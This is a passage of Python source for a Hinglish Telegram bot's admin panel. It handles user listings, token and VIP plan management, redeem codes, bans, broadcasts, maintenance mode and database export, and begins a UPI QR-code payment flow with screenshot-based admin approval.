    text = f"<blockquote>👥 <b>Total Users: {len(users)}</b>\n━━━━━━━━━━━━━━━━━━━━\n"
    for uid, data in list(users.items())[-15:]:
        text += f"• <b>{data.get('name','N/A')}</b> | <code>{uid}</code> | {data.get('username','N/A')}\n"
    text += f"\n{DEV_TAG}</blockquote>"
    bot.send_message(message.chat.id, text)

# ----- 20.2 User Plan View -----
@bot.message_handler(func=lambda m: m.text == BTN_USER_PLAN)
def admin_user_plan(message):
    if not _is_admin(message.from_user.id): return
    db = load_db()
    users = db.get("users", {})
    text = "<blockquote>📋 <b>Users Plan</b>\n━━━━━━━━━━━━━━━━━━━━\n"
    now = datetime.now()
    count = 0
    for uid, data in list(users.items())[-20:]:
        count += 1
        plan = data.get("plan", "free")
        expiry = data.get("expiry")
        tokens = data.get("tokens", 0)
        if int(uid) == ADMIN_ID:
            status = "👑 Admin VIP"
        elif plan == "unlimited" and expiry:
            exp_dt = datetime.strptime(expiry, "%Y-%m-%d %H:%M:%S")
            if now < exp_dt:
                days = max(1, (exp_dt - now).days + 1)
                status = f"👑 VIP ({days}d)"
            else:
                status = f"⚠️ Expired | {tokens} tokens"
        elif tokens > 0:
            status = f"🪙 Normal ({tokens})"
        else:
            status = "❌ Free"
        text += f"• <b>{data.get('name','N/A')}</b>\n  UID: <code>{uid}</code>\n  Status: <b>{status}</b>\n\n"
    if count == 0: text += "No users.\n"
    text += f"{DEV_TAG}</blockquote>"
    bot.send_message(message.chat.id, text)

# ----- 20.3 Activate Plan Info -----
@bot.message_handler(func=lambda m: m.text == BTN_ACTIVATE_PLAN)
def admin_activate_info(message):
    if not _is_admin(message.from_user.id): return
    text = (
        f"<blockquote>⚡ <b>Direct Commands</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"<code>/setvip UID DAYS</code>\n"
        f"<code>/addtokens UID TOKENS</code>\n"
        f"<code>/broadcast_vip DAYS</code>\n"
        f"<code>/addall TOKENS</code>\n"
        f"<code>/deductall TOKENS</code>\n"
        f"<code>/setref CREDITS</code>\n"
        f"{DEV_TAG}</blockquote>"
    )
    bot.send_message(message.chat.id, text)

# ----- 20.4 Generate Redeem -----
@bot.message_handler(func=lambda m: m.text == BTN_GEN_REDEEM)
def admin_gen_redeem(message):
    if not _is_admin(message.from_user.id): return
    bot.send_message(message.chat.id,
        f"<blockquote>Type select:\n{DEV_TAG}</blockquote>",
        reply_markup=get_redeem_type_menu())

@bot.message_handler(func=lambda m: m.text == "Normal" and int(m.from_user.id) == ADMIN_ID)
def admin_normal_users(message):
    msg = bot.send_message(message.chat.id,
        f"<blockquote>Kitne users?\n{DEV_TAG}</blockquote>",
        reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_normal_tokens)

def admin_normal_tokens(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    try:
        users_count = int(message.text.strip())
        msg = bot.send_message(message.chat.id, f"<blockquote>Tokens per user?\n{DEV_TAG}</blockquote>")
        bot.register_next_step_handler(msg, admin_normal_create, users_count)
    except ValueError:
        bot.send_message(message.chat.id, f"<blockquote>❌ Number!\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu())

def admin_normal_create(message, users_count):
    try:
        tokens_count = int(message.text.strip())
        code = "AYUSH-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        db = load_db()
        db["redeem_codes"][code] = {"type": "token", "value": tokens_count,
                                    "uses_left": users_count, "used_by": [], "note": "Normal"}
        save_db(db)
        bot.send_message(message.chat.id,
            f"<blockquote>🎟 <b>Code!</b>\nCode: <code>{code}</code>\nUsers: {users_count}\nTokens: {tokens_count}\n{DEV_TAG}</blockquote>",
            reply_markup=get_admin_menu())
    except ValueError:
        bot.send_message(message.chat.id, f"<blockquote>❌ Invalid!\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == "VIP" and int(m.from_user.id) == ADMIN_ID)
def admin_vip_users(message):
    msg = bot.send_message(message.chat.id,
        f"<blockquote>Kitne users?\n{DEV_TAG}</blockquote>",
        reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_vip_days)

def admin_vip_days(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    try:
        users_count = int(message.text.strip())
        msg = bot.send_message(message.chat.id, f"<blockquote>Kitne din?\n{DEV_TAG}</blockquote>")
        bot.register_next_step_handler(msg, admin_vip_create, users_count)
    except ValueError:
        bot.send_message(message.chat.id, f"<blockquote>❌ Number!\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu())

def admin_vip_create(message, users_count):
    try:
        days_count = int(message.text.strip())
        code = "AYUSH-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        db = load_db()
        db["redeem_codes"][code] = {"type": "unlimited", "days": days_count,
                                    "uses_left": users_count, "used_by": [], "note": "VIP"}
        save_db(db)
        bot.send_message(message.chat.id,
            f"<blockquote>👑 <b>VIP Code!</b>\nCode: <code>{code}</code>\nUsers: {users_count}\nDays: {days_count}\n{DEV_TAG}</blockquote>",
            reply_markup=get_admin_menu())
    except ValueError:
        bot.send_message(message.chat.id, f"<blockquote>❌ Invalid!\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu())

# ----- 20.5 Add All -----
@bot.message_handler(func=lambda m: m.text == BTN_ADD_ALL)
def admin_add_all(message):
    if not _is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id,
        f"<blockquote>Kitne tokens sabhi users me add?\n{DEV_TAG}</blockquote>",
        reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_add_all_apply)

def admin_add_all_apply(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    try:
        tokens = int(message.text.strip())
        if tokens <= 0: raise ValueError
        db = load_db()
        count = 0
        for uid in db["users"]:
            db["users"][uid]["tokens"] = db["users"][uid].get("tokens", 0) + tokens
            _add_history(db["users"][uid], "admin_add_all", tokens)
            count += 1
        save_db(db)
        bot.send_message(message.chat.id,
            f"<blockquote>✅ <b>{tokens} tokens</b> added to <b>{count} users</b>!\n{DEV_TAG}</blockquote>",
            reply_markup=get_admin_menu())
    except ValueError:
        bot.send_message(message.chat.id, f"<blockquote>❌ Sahi number!\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu())

# ----- 20.6 Deduct All -----
@bot.message_handler(func=lambda m: m.text == BTN_DEDUCT_ALL)
def admin_deduct_all(message):
    if not _is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id,
        f"<blockquote>Kitne tokens sabhi users se deduct?\n{DEV_TAG}</blockquote>",
        reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_deduct_all_apply)

def admin_deduct_all_apply(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    try:
        tokens = int(message.text.strip())
        if tokens <= 0: raise ValueError
        db = load_db()
        count = 0
        for uid in db["users"]:
            cur = db["users"][uid].get("tokens", 0)
            db["users"][uid]["tokens"] = max(0, cur - tokens)
            _add_history(db["users"][uid], "admin_deduct_all", -tokens)
            count += 1
        save_db(db)
        bot.send_message(message.chat.id,
            f"<blockquote>✅ <b>{tokens} tokens</b> deducted from <b>{count} users</b>!\n{DEV_TAG}</blockquote>",
            reply_markup=get_admin_menu())
    except ValueError:
        bot.send_message(message.chat.id, f"<blockquote>❌ Sahi number!\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu())

# ----- 20.7 Add 1 User -----
@bot.message_handler(func=lambda m: m.text == BTN_ADD_ONE)
def admin_add_one(message):
    if not _is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id,
        f"<blockquote>Format: <code>UID TOKENS</code>\nExample: <code>123456789 50</code>\n{DEV_TAG}</blockquote>",
        reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_add_one_apply)

def admin_add_one_apply(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    try:
        parts = message.text.split()
        uid, tokens = parts[0], int(parts[1])
        if tokens <= 0: raise ValueError
        db = load_db()
        if uid not in db["users"]: raise KeyError
        db["users"][uid]["tokens"] = db["users"][uid].get("tokens", 0) + tokens
        _add_history(db["users"][uid], "admin_add", tokens)
        save_db(db)
        bot.send_message(message.chat.id,
            f"<blockquote>✅ <code>{uid}</code> +<b>{tokens}</b>\n💰 Balance: <b>{db['users'][uid]['tokens']}</b>\n{DEV_TAG}</blockquote>",
            reply_markup=get_admin_menu())
    except KeyError:
        bot.send_message(message.chat.id, f"<blockquote>❌ User nahi mila!\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu())
    except Exception:
        bot.send_message(message.chat.id, f"<blockquote>❌ Format: <code>UID TOKENS</code>\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu())

# ----- 20.8 Deduct 1 User -----
@bot.message_handler(func=lambda m: m.text == BTN_DEDUCT_ONE)
def admin_deduct_one(message):
    if not _is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id,
        f"<blockquote>Format: <code>UID TOKENS</code>\n{DEV_TAG}</blockquote>",
        reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_deduct_one_apply)

def admin_deduct_one_apply(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    try:
        parts = message.text.split()
        uid, tokens = parts[0], int(parts[1])
        if tokens <= 0: raise ValueError
        db = load_db()
        if uid not in db["users"]: raise KeyError
        cur = db["users"][uid].get("tokens", 0)
        db["users"][uid]["tokens"] = max(0, cur - tokens)
        _add_history(db["users"][uid], "admin_deduct", -tokens)
        save_db(db)
        bot.send_message(message.chat.id,
            f"<blockquote>✅ <code>{uid}</code> -<b>{tokens}</b>\n💰 Balance: <b>{db['users'][uid]['tokens']}</b>\n{DEV_TAG}</blockquote>",
            reply_markup=get_admin_menu())
    except KeyError:
        bot.send_message(message.chat.id, f"<blockquote>❌ User nahi mila!\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu())
    except Exception:
        bot.send_message(message.chat.id, f"<blockquote>❌ Format: <code>UID TOKENS</code>\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu())

# ----- 20.9 Check User -----
@bot.message_handler(func=lambda m: m.text == BTN_CHECK_USER)
def admin_check_user(message):
    if not _is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id, f"<blockquote>UID bhejein:\n{DEV_TAG}</blockquote>",
        reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_check_apply)

def admin_check_apply(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    uid = message.text.strip()
    db = load_db()
    u = db["users"].get(uid)
    if not u:
        bot.send_message(message.chat.id, f"<blockquote>❌ User nahi mila!\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu()); return
    text = (
        f"<blockquote>👤 <b>User Details</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📛 {u.get('name','N/A')}\n"
        f"🔗 {u.get('username','N/A')}\n"
        f"🆔 <code>{uid}</code>\n"
        f"🪙 Tokens: <b>{u.get('tokens',0)}</b>\n"
        f"📦 Plan: <b>{u.get('plan','free')}</b>\n"
        f"⏳ Expiry: <b>{u.get('expiry') or 'N/A'}</b>\n"
        f"🚫 Banned: <b>{'Yes' if u.get('banned') else 'No'}</b>\n"
        f"👥 Referrals: <b>{len(u.get('referrals',[]))}</b>\n"
        f"{DEV_TAG}</blockquote>"
    )
    bot.send_message(message.chat.id, text, reply_markup=get_admin_menu())

# ----- 20.10 Reset User -----
@bot.message_handler(func=lambda m: m.text == BTN_RESET_USER)
def admin_reset_user(message):
    if not _is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id, f"<blockquote>UID bhejein (reset):\n{DEV_TAG}</blockquote>",
        reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_reset_apply)

def admin_reset_apply(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    uid = message.text.strip()
    db = load_db()
    if uid not in db["users"]:
        bot.send_message(message.chat.id, f"<blockquote>❌ User nahi mila!\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu()); return
    db["users"][uid]["tokens"] = 0
    db["users"][uid]["plan"] = "free"
    db["users"][uid]["expiry"] = None
    db["users"][uid]["banned"] = False
    save_db(db)
    bot.send_message(message.chat.id, f"<blockquote>♻️ <code>{uid}</code> reset!\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu())

# ----- 20.11 Codes List -----
@bot.message_handler(func=lambda m: m.text == BTN_CODES_LIST)
def admin_codes_list(message):
    if not _is_admin(message.from_user.id): return
    db = load_db()
    codes = db.get("redeem_codes", {})
    if not codes:
        bot.send_message(message.chat.id, f"<blockquote>❌ Koi active code nahi.\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu()); return
    text = f"<blockquote>🎟 <b>Active Codes ({len(codes)})</b>\n━━━━━━━━━━━━━━━━━━━━\n"
    for code, d in list(codes.items())[:30]:
        if d.get("type") == "token":
            val = f"{d.get('value')} tokens"
        else:
            val = f"VIP {d.get('days')}d"
        text += f"<code>{code}</code> | {val} | Left: {d.get('uses_left')}\n"
    text += f"\n{DEV_TAG}</blockquote>"
    bot.send_message(message.chat.id, text, reply_markup=get_admin_menu())

# ----- 20.12 Revoke Code -----
@bot.message_handler(func=lambda m: m.text == BTN_REVOKE_CODE)
def admin_revoke_code(message):
    if not _is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id, f"<blockquote>Code bhejein:\n{DEV_TAG}</blockquote>",
        reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_revoke_apply)

def admin_revoke_apply(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    code = message.text.strip().upper()
    db = load_db()
    if code in db.get("redeem_codes", {}):
        del db["redeem_codes"][code]
        save_db(db)
        bot.send_message(message.chat.id, f"<blockquote>🗑 <code>{code}</code> revoked!\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu())
    else:
           bot.send_message(message.chat.id, f"<blockquote>❌ Code nahi mila!\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu())

# ----- 20.13 Stats -----
@bot.message_handler(func=lambda m: m.text == BTN_STATS)
def admin_stats(message):
    if not _is_admin(message.from_user.id): return
    db = load_db()
    users = db.get("users", {})
    total = len(users)
    vip = sum(1 for u in users.values() if u.get("plan") == "unlimited")
    with_tokens = sum(1 for u in users.values() if u.get("tokens", 0) > 0)
    banned = sum(1 for u in users.values() if u.get("banned"))
    codes = len(db.get("redeem_codes", {}))
    total_tokens = sum(u.get("tokens", 0) for u in users.values())
    text = (
        f"<blockquote>📊 <b>Bot Statistics</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👥 Total Users: <b>{total}</b>\n"
        f"👑 VIP Users: <b>{vip}</b>\n"
        f"🪙 Token Holders: <b>{with_tokens}</b>\n"
        f"💎 Total Tokens in System: <b>{total_tokens}</b>\n"
        f"🚫 Banned: <b>{banned}</b>\n"
        f"🎟 Active Codes: <b>{codes}</b>\n"
        f"{DEV_TAG}</blockquote>"
    )
    bot.send_message(message.chat.id, text, reply_markup=get_admin_menu())

# ----- 20.14 Broadcast -----
@bot.message_handler(func=lambda m: m.text == BTN_BROADCAST)
def admin_broadcast(message):
    if not _is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id, f"<blockquote>Broadcast message:\n{DEV_TAG}</blockquote>",
        reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_broadcast_apply)

def admin_broadcast_apply(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    db = load_db()
    ok = fail = 0
    for uid in db["users"]:
        try:
            bot.send_message(int(uid), message.text)
            ok += 1
        except Exception:
            fail += 1
        time.sleep(0.05)
    bot.send_message(message.chat.id,
        f"<blockquote>📢 <b>Broadcast Done!</b>\n✅ OK: {ok}\n❌ Fail: {fail}\n{DEV_TAG}</blockquote>",
        reply_markup=get_admin_menu())

# ----- 20.15 Ban -----
@bot.message_handler(func=lambda m: m.text == BTN_BAN)
def admin_ban(message):
    if not _is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id, f"<blockquote>UID (ban):\n{DEV_TAG}</blockquote>",
        reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_ban_apply)

def admin_ban_apply(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    uid = message.text.strip()
    db = load_db()
    if uid not in db["users"]:
        bot.send_message(message.chat.id, f"<blockquote>❌ User nahi mila!\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu()); return
    db["users"][uid]["banned"] = True
    save_db(db)
    bot.send_message(message.chat.id, f"<blockquote>🚫 <code>{uid}</code> banned!\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu())

# ----- 20.16 Unban -----
@bot.message_handler(func=lambda m: m.text == BTN_UNBAN)
def admin_unban(message):
    if not _is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id, f"<blockquote>UID (unban):\n{DEV_TAG}</blockquote>",
        reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_unban_apply)

def admin_unban_apply(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    uid = message.text.strip()
    db = load_db()
    if uid not in db["users"]:
        bot.send_message(message.chat.id, f"<blockquote>❌ User nahi mila!\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu()); return
    db["users"][uid]["banned"] = False
    save_db(db)
    bot.send_message(message.chat.id, f"<blockquote>✅ <code>{uid}</code> unbanned!\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu())

# ----- 20.17 Set Referral -----
@bot.message_handler(func=lambda m: m.text == BTN_SET_REF)
def admin_set_ref(message):
    if not _is_admin(message.from_user.id): return
    db = load_db()
    cur = db["settings"].get("referral_credits", 2)
    msg = bot.send_message(message.chat.id,
        f"<blockquote>⚙️ <b>Set Referral Credits</b>\n"
        f"Current: <b>{cur} tokens/invite</b>\n\n"
        f"Naya value (1/2/5/10):\n{DEV_TAG}</blockquote>",
        reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_set_ref_apply)

def admin_set_ref_apply(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    try:
        val = int(message.text.strip())
        if val < 1 or val > 100: raise ValueError
        db = load_db()
        db["settings"]["referral_credits"] = val
        save_db(db)
        bot.send_message(message.chat.id,
            f"<blockquote>✅ Referral = <b>{val} tokens</b>/invite!\n{DEV_TAG}</blockquote>",
            reply_markup=get_admin_menu())
    except ValueError:
        bot.send_message(message.chat.id, f"<blockquote>❌ 1-100 number!\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu())

# ----- 20.18 Maintenance -----
@bot.message_handler(func=lambda m: m.text == BTN_MAINTENANCE)
def admin_maintenance(message):
    if not _is_admin(message.from_user.id): return
    db = load_db()
    cur = db["settings"].get("maintenance", False)
    db["settings"]["maintenance"] = not cur
    save_db(db)
    status = "🔴 ON" if not cur else "🟢 OFF"
    bot.send_message(message.chat.id,
        f"<blockquote>🔧 <b>Maintenance: {status}</b>\n"
        f"{'Ab sirf admin use kar sakta hai.' if not cur else 'Sab users use kar sakte hain.'}\n"
        f"{DEV_TAG}</blockquote>", reply_markup=get_admin_menu())

# ----- 20.19 Export DB -----
@bot.message_handler(func=lambda m: m.text == BTN_EXPORT_DB)
def admin_export_db(message):
    if not _is_admin(message.from_user.id): return
    try:
        with open("database.json", "rb") as f:
            bot.send_document(message.chat.id, f,
                caption=f"<blockquote>📤 <b>Database Export</b>\n{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</blockquote>")
    except Exception as e:
        bot.send_message(message.chat.id, f"<blockquote>❌ Export failed: {e}\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu())

# ============================================================
# ============ 21. DIRECT ADMIN COMMANDS =====================
# ============================================================
@bot.message_handler(commands=['setvip'])
def cmd_setvip(message):
    if not _is_admin(message.from_user.id): return
    try:
        _, target_uid, days = message.text.split()
        days = int(days)
        db = load_db()
        if target_uid not in db["users"]:
            bot.reply_to(message, f"<blockquote>❌ User nahi mila!\n{DEV_TAG}</blockquote>")
            return
        db["users"][target_uid]["plan"] = "unlimited"
        db["users"][target_uid]["expiry"] = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
        _add_history(db["users"][target_uid], f"admin_setvip_{days}d", 0)
        save_db(db)
        bot.reply_to(message, f"<blockquote>✅ <code>{target_uid}</code> → <b>{days} din VIP</b>\n{DEV_TAG}</blockquote>")
    except Exception:
        bot.reply_to(message, f"<blockquote>Usage: <code>/setvip UID DAYS</code>\n{DEV_TAG}</blockquote>")
@bot.message_handler(commands=['addtokens'])
def cmd_addtokens(message):
    if not _is_admin(message.from_user.id): return
    try:
        _, target_uid, tokens = message.text.split()
        tokens = int(tokens)
        db = load_db()
        if target_uid not in db["users"]:
            bot.reply_to(message, f"<blockquote>❌ User nahi mila!\n{DEV_TAG}</blockquote>")
            return
        db["users"][target_uid]["tokens"] = db["users"][target_uid].get("tokens", 0) + tokens
        _add_history(db["users"][target_uid], "admin_addtokens", tokens)
        save_db(db)
        bot.reply_to(message, f"<blockquote>✅ <code>{target_uid}</code> +<b>{tokens}</b>\n💰 {db['users'][target_uid]['tokens']}\n{DEV_TAG}</blockquote>")
    except Exception:
        bot.reply_to(message, f"<blockquote>Usage: <code>/addtokens UID TOKENS</code>\n{DEV_TAG}</blockquote>")

@bot.message_handler(commands=['broadcast_vip'])
def cmd_broadcast_vip(message):
    if not _is_admin(message.from_user.id): return
    try:
        _, days = message.text.split()
        days = int(days)
        db = load_db()
        expiry = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
        count = 0
        for uid in db["users"]:
            db["users"][uid]["plan"] = "unlimited"
            db["users"][uid]["expiry"] = expiry
            _add_history(db["users"][uid], f"broadcast_vip_{days}d", 0)
            count += 1
        save_db(db)
        bot.reply_to(message, f"<blockquote>🎉 <b>{days}d VIP</b> sabhi <b>{count} users</b> ko!\n{DEV_TAG}</blockquote>")
    except Exception:
        bot.reply_to(message, f"<blockquote>Usage: <code>/broadcast_vip DAYS</code>\n{DEV_TAG}</blockquote>")

@bot.message_handler(commands=['addall'])
def cmd_addall(message):
    if not _is_admin(message.from_user.id): return
    try:
        _, tokens = message.text.split()
        tokens = int(tokens)
        if tokens <= 0: raise ValueError
        db = load_db()
        count = 0
        for uid in db["users"]:
            db["users"][uid]["tokens"] = db["users"][uid].get("tokens", 0) + tokens
            _add_history(db["users"][uid], "admin_addall", tokens)
            count += 1
        save_db(db)
        bot.reply_to(message, f"<blockquote>✅ <b>{tokens}</b> added to <b>{count}</b> users!\n{DEV_TAG}</blockquote>")
    except Exception:
        bot.reply_to(message, f"<blockquote>Usage: <code>/addall TOKENS</code>\n{DEV_TAG}</blockquote>")

@bot.message_handler(commands=['deductall'])
def cmd_deductall(message):
    if not _is_admin(message.from_user.id): return
    try:
        _, tokens = message.text.split()
        tokens = int(tokens)
        if tokens <= 0: raise ValueError
        db = load_db()
        count = 0
        for uid in db["users"]:
            cur = db["users"][uid].get("tokens", 0)
            db["users"][uid]["tokens"] = max(0, cur - tokens)
            _add_history(db["users"][uid], "admin_deductall", -tokens)
            count += 1
        save_db(db)
        bot.reply_to(message, f"<blockquote>✅ <b>{tokens}</b> deducted from <b>{count}</b> users!\n{DEV_TAG}</blockquote>")
    except Exception:
        bot.reply_to(message, f"<blockquote>Usage: <code>/deductall TOKENS</code>\n{DEV_TAG}</blockquote>")

@bot.message_handler(commands=['setref'])
def cmd_setref(message):
    if not _is_admin(message.from_user.id): return
    try:
        _, credits = message.text.split()
        credits = int(credits)
        if credits < 1 or credits > 100: raise ValueError
        db = load_db()
        db["settings"]["referral_credits"] = credits
        save_db(db)
        bot.reply_to(message, f"<blockquote>✅ Referral = <b>{credits}</b>/invite!\n{DEV_TAG}</blockquote>")
    except Exception:
        bot.reply_to(message, f"<blockquote>Usage: <code>/setref CREDITS</code>\n{DEV_TAG}</blockquote>")

# ----------------- DIRECT BUY / UPI PAYMENT -----------------
def money(value):
    return Decimal(str(value)).quantize(Decimal("0.01"), rounding=ROUND_HALF_UP)

def buy_keyboard(admin=False):
    db = load_db()
    mk = types.InlineKeyboardMarkup(row_width=1)
    for pid, plan in db.get("plans", DEFAULT_PLANS).items():
        if plan.get("active", True):
            original = money(plan.get("price", 0))
            final = money(original * (Decimal("1") - DISCOUNT_RATE))
            mk.add(types.InlineKeyboardButton(
                f"🛍 {plan.get('name', pid)} | ₹{final} (5% OFF)",
                callback_data=f"buy_plan:{pid}"))
    return mk

@bot.message_handler(func=lambda m: m.text == BTN_BUY)
def direct_buy_menu(message):
    bot.send_message(message.chat.id,
        "<blockquote>💳 <b>DIRECT BUY — 5% OFF</b>\nPlan choose karein. QR mein discounted amount prefill hoga.\n"
        "Payment apne UPI app mein khud verify karke complete karein.\n" + DEV_TAG + "</blockquote>",
        reply_markup=buy_keyboard())

@bot.callback_query_handler(func=lambda c: c.data == "buy_open")
def buy_open_callback(call):
    if call.message.chat.type != "private": return
    if load_db().get("settings", {}).get("maintenance") and not _is_admin(call.from_user.id):
        bot.answer_callback_query(call.id, "Bot maintenance mein hai.", show_alert=True); return
    bot.answer_callback_query(call.id)
    bot.send_message(call.message.chat.id, "<blockquote>💳 <b>5% OFF DIRECT BUY</b>\nPlan select karein.\n" + DEV_TAG + "</blockquote>", reply_markup=buy_keyboard())

@bot.callback_query_handler(func=lambda c: c.data.startswith("buy_plan:"))
def buy_plan_callback(call):
    if call.message.chat.type != "private": return
    if load_db().get("settings", {}).get("maintenance") and not _is_admin(call.from_user.id):
        bot.answer_callback_query(call.id, "Bot maintenance mein hai.", show_alert=True); return
    get_user_data(call.from_user)
    pid = call.data.split(":", 1)[1]
    db = load_db(); plan = db.get("plans", {}).get(pid)
    if not plan or not plan.get("active", True):
        bot.answer_callback_query(call.id, "Plan available nahi hai.", show_alert=True); return
    original = money(plan["price"])
    discount = money(original * DISCOUNT_RATE)
    amount = money(original - discount)
    order_id = uuid.uuid4().hex[:10].upper()
    note = f"Order {order_id}"
    uri = "upi://pay?" + urlencode({"pa": UPI_ID, "pn": "Ayush", "am": f"{amount:.2f}", "cu": "INR", "tn": note})
    qr = qrcode.QRCode(box_size=8, border=3); qr.add_data(uri); qr.make(fit=True)
    image = qr.make_image(fill_color="black", back_color="white")
    bio = io.BytesIO(); bio.name = "upi_qr.png"; image.save(bio, format="PNG"); bio.seek(0)
    db.setdefault("pending_orders", {})[order_id] = {
        "uid": str(call.from_user.id), "plan_id": pid, "plan": plan.copy(),
        "original": str(original), "discount": str(discount), "amount": str(amount),
        "status": "awaiting_payment", "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    save_db(db)
    caption = (f"<b>🧾 Order: <code>{order_id}</code></b>\n"
        f"Plan: {plan.get('name', pid)}\nOriginal: ₹{original}\n5% OFF: -₹{discount}\n"
        f"<b>Payable: ₹{amount}</b>\nUPI: <code>{UPI_ID}</code>\n\n"
        "QR scan karke payment karein. Payment ke baad isi chat mein transaction screenshot bhejein. "
        "Admin bank/UPI statement se verify karega. Screenshot alone payment proof nahi hai.")
    bot.answer_callback_query(call.id, "Order generated")
    bot.send_photo(call.message.chat.id, bio, caption=caption, parse_mode="HTML")
    bot.send_message(call.message.chat.id, f"Order ID: <code>{order_id}</code>\nAb payment screenshot bhejein.", parse_mode="HTML")
    bot.register_next_step_handler_by_chat_id(call.message.chat.id, receive_payment_screenshot, order_id)

def receive_payment_screenshot(message, order_id):
    db = load_db(); order = db.get("pending_orders", {}).get(order_id)
    if not order or order.get("uid") != str(message.from_user.id) or order.get("status") != "awaiting_payment":
        bot.send_message(message.chat.id, "Order valid nahi hai. DIRECT BUY se naya order banayein."); return
    if not message.photo:
        bot.send_message(message.chat.id, "Payment screenshot as a photo bhejein; order pending rahega.")
        bot.register_next_step_handler_by_chat_id(message.chat.id, receive_payment_screenshot, order_id)
        return
    file_id = message.photo[-1].file_id
    order["screenshot_file_id"] = file_id
    order["status"] = "pending_admin"
    save_db(db)
    mk = types.InlineKeyboardMarkup()
    mk.row(types.InlineKeyboardButton("✅ Approve", callback_data=f"pay_approve:{order_id}"),
